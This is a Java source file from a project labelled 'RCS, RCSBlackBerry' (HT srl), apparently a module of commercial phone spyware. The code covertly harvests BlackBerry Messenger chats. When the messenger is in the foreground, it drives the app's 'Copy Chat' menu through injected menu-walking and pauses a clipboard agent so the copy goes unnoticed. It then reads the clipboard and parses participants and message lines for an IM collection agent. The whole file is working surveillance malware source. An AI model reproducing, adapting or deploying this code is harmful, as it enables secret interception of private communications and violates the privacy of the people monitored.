//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.agent.im;

import java.util.Hashtable;
import java.util.Vector;

import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.Clipboard;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import blackberry.agent.ClipBoardAgent;
import blackberry.agent.ImAgent;
import blackberry.crypto.Encryption;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.MenuWalker;
import blackberry.utils.StringUtils;

public class ConversationScreen {
    //#ifdef DEBUG
    private static Debug debug = new Debug("ConvScreen", DebugLevel.VERBOSE);
    //#endif

    // Vector<String>
    private static Vector parts;
    private static String partecipants;

    private UiApplication bbmApplication;
    // Vector<Screen>
    //private Vector conversationScreens = new Vector();
    // Hashtable<Screen,CRC32>
    Hashtable conversations = new Hashtable();

    private String lastConversation = null;

    public void setBBM(UiApplication bbmApplication) {
        this.bbmApplication = bbmApplication;
    }

    /**
     * retrieves the screen, if it's the conversation one, calls the copy and
     * parses the content
     */
    public synchronized void getConversationScreen() {
        try {
            if (bbmApplication == null || !Backlight.isEnabled()) {
                //#ifdef DEMO
                Debug.ledFlash(Debug.COLOR_RED);
                //#endif
                return;
            }

            Screen screen = bbmApplication.getActiveScreen();

            //#ifdef DEBUG
            debug.info("leech active screen: " + screen);
            //#endif

            if (bbmApplication.isForeground()) {
                if (screen.getClass().getName().indexOf("ConversationScreen") >= 0) {

                    String newConversation = extractConversation(screen);

                    if (!conversations.containsKey(screen)) {
                        //#ifdef DEBUG
                        debug.info("Added new conversation screen: " + screen);
                        //#endif
                        conversations.put(screen,
                                new Integer(Encryption.CRC32(newConversation)));

                        // exploreField(screen, 0, new String[0]);
                    } else {
                        // se conversation e' uguale all'ultima parsata non fare niente.
                        Integer hash = (Integer) conversations.get(screen);
                        if (hash.equals(new Integer(Encryption
                                .CRC32(newConversation)))) {
                            //#ifdef DEBUG
                            debug.trace("getConversationScreen: equal conversation, ignore it");
                            //#endif
                            return;
                        }
                    }

                    // parse della conversazione.
                    // result e' un vettore di stringhe
                    Vector result = parseConversation(newConversation,
                            lastConversation);
                    lastConversation = newConversation;

                    if (result != null) {
                        //#ifdef DBC
                        Check.asserts(result.size() == 2,
                                "wrong size result:  " + result.size());
                        //#endif

                        String partecipants = (String) result.elementAt(0);
                        Vector lines = (Vector) result.elementAt(1);

                        ImAgent agent = ImAgent.getInstance();
                        agent.add(partecipants, lines);

                        //#ifdef DEMO
                        Debug.ledFlash(Debug.COLOR_YELLOW);
                        //#endif
                    }
                } else {
                    //#ifdef DEBUG
                    debug.trace("getConversationScreen no screen: "
                            + screen.getClass().getName());
                    //#endif
                }
            }
            /*
             * if (screen.getClass().getName().indexOf("UserInfoScreen") >= 0) {
             * if (Backlight.isEnabled()) { //FieldExplorer explorer = new
             * FieldExplorer(); //Vector textfields = explorer.explore(screen,
             * true); } }
             */
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("getConversationScreen: " + ex);
            ex.printStackTrace();
            //#endif

        }
        return;
    }

    private String extractConversation(Screen screen) {
        //#ifdef DEBUG
        debug.trace("extractConversation");
        //#endif

        //String before = (String) Clipboard.getClipboard().get();
        String clip = null;
        // debug.trace("try copy chat: "+screen);
        ClipBoardAgent.getInstance().suspendClip();
        if (MenuWalker.walk(new String[] { "Copy Chat", "Copy History" },
                screen, true)) {

            clip = (String) Clipboard.getClipboard().get();
            ClipBoardAgent.getInstance().setClip(clip);

            if (!conversations.containsKey(screen)) {
                //#ifdef DEBUG
                debug.info("adding clip to screens: " + clip);
                //#endif
            }

        } else {
            //#ifdef DEBUG
            debug.info("NO Conversation screen!");
            //#endif
        }
        ClipBoardAgent.getInstance().resumeClip();
        return clip;
    }

    /**
     * parse conversation
     * 
     * @param conversation
     * @param lastConversation2
     * @return Vector<String partecipants, Vector<String line> lines>
     */
    public static Vector parseConversation(String newConversation,
            String lastConversation) {

        //#ifdef DBC
        Check.requires(newConversation != null,
                "parseConversation, null newCoversation");
        //#endif

        //#ifdef DEBUG
        int lastLen = 0;
        if (lastConversation != null) {
            lastLen = lastConversation.length();
        }
        debug.trace("parseConversation new: " + newConversation.length()
                + " last: " + lastLen);
        //#endif

        String lineConversation = StringUtils.diffStrings(newConversation,
                lastConversation);
        boolean full;

        //#ifdef DEBUG
        debug.trace("parseConversation lineConversation: " + lineConversation);
        //#endif

        if (lineConversation.startsWith("Participants")) {
            full = true;
            //#ifdef DEBUG
            debug.trace("parseConversation: full");
            //#endif
            return parseFullConversation(newConversation);

        } else {
            full = false;
            //#ifdef DEBUG
            debug.trace("parseConversation: partial");
            //#endif
            return parseLinesConversation(lineConversation, 0);
        }
    }

    /**
     * parses partial conversation, containing only lines. this method requires
     * that the parseFull has already been called once.
     * 
     * @param conversation
     * @param posMessages
     * @return
     */
    private static Vector parseLinesConversation(String conversation,
            int posMessages) {
        try {
            //#ifdef DBC
            Check.requires(partecipants != null, "null partecipants");
            Check.requires(parts != null && parts.size() > 1, "null parts");
            //#endif
            Vector result = new Vector();

            int numLine = 1;

            Vector lines = new Vector();

            // per ogni linea
            //   se e' un inizio
            //       si elabora la last
            //       last = current.startAfter(partecipant)
            //   senno' 
            //       last += current
            // elabora la last
            String lastLine = "";
            while (true) {
                String currentLine = StringUtils.getNextLine(conversation,
                        posMessages);
                if (currentLine == null) {
                    break;
                }
                posMessages += currentLine.length() + 1;

                if (numLine < 5) {
                    //#ifdef DEBUG
                    debug.trace("line " + numLine + " : " + currentLine);
                    //#endif
                }
                numLine += 1;

                int lineStart = searchPartecipantIter(currentLine);

                if (lineStart > 0) {
                    // c'e' un partecipante
                    // elabora la linea precedente
                    //#ifdef DEBUG
                    debug.trace("parseConversation part line: " + currentLine);
                    //#endif
                    String ll = lastLine.trim();
                    if (!StringUtils.empty(ll)) {
                        lines.addElement(ll);
                    } else {
                        //#ifdef DEBUG
                        debug.trace("parseLinesConversation: empty line");
                        //#endif
                    }
                    lastLine = currentLine;
                } else {
                    //#ifdef DEBUG
                    debug.trace("parseConversation adding line: " + currentLine);
                    //#endif
                    lastLine += " " + currentLine;
                }

            }
            //adding last line
            String ll = lastLine.trim();
            if (!StringUtils.empty(ll)) {
                lines.addElement(ll);
            }

            //agent.add(partecipants, lines);
            //#ifdef DEBUG
            debug.info("num lines: " + numLine);
            //#endif
            result.addElement(partecipants);
            result.addElement(lines);

            //#ifdef DBC
            Check.ensures(result.size() == 2, "wrong size result");
            //#endif
            return result;
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("parseConversation: " + ex);
            //#endif
            return null;
        }
    }

    /**
     * parses a full conversation. gets the partecipants and retrives the lines.
     * 
     * @param conversation
     * @return
     */
    public static Vector parseFullConversation(String conversation) {
        // Participants:
        // -------------
        // Torcione, Whiteberry
        //
        // Messages:
        // ---------
        // Torcione: Scrivo anche a he
        // e poi vado a capo
        // diverse volte
        // Whiteberry: grazie

        try {
            int pos = conversation.indexOf("-------------");
            //#ifdef DBC
            Check.asserts(pos >= 0, "no delimiter found");
            //#endif

            int partStart = conversation.indexOf("\n", pos) + 1;
            int partSep = conversation.indexOf(", ", partStart);
            int partEnd = conversation.indexOf("\n", partSep);

            partecipants = conversation.substring(partStart, partEnd).trim();
            parts = StringUtils.split(partecipants, ", ");

            //#ifdef DBC
            Check.asserts(!StringUtils.empty(partecipants),
                    "empty partecipants");
            Check.asserts(parts.size() >= 2, "wrong size parts");
            //#endif

            // lines start at line 6
            int posMessages = StringUtils.getLinePos(conversation, 6);

            // actual line parsing
            return parseLinesConversation(conversation, posMessages);
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("parseConversation: " + ex);
            //#endif
            return null;
        }
    }

    // se ci sono i partecipanti, restituisce la posizione dopo il :
    // senno 0
    private static int searchPartecipantsDelimiter(String currentLine) {
        int pos = 0;

        pos = currentLine.indexOf(": ");
        if (pos > 0) {
            String part = currentLine.substring(0, pos);
            if (parts.contains(part)) {
                return pos + 2;
            }
        }

        return 0;
    }

    /**
     * check for partecipants looking at the parts vector. safer method than
     * searchPartecipantsDelimiter
     * 
     * @param currentLine
     * @return
     */
    private static int searchPartecipantIter(String currentLine) {
        //#ifdef DBC
        Check.requires(parts != null && parts.size() > 1, "empty parts");
        //#endif

        int pos = 0;

        for (int i = 0; i < parts.size(); i++) {
            String part = (String) parts.elementAt(i);
            pos = currentLine.indexOf(part);
            if (pos == 0) {
                return part.length();
            }
        }
        return 0;
    }
}
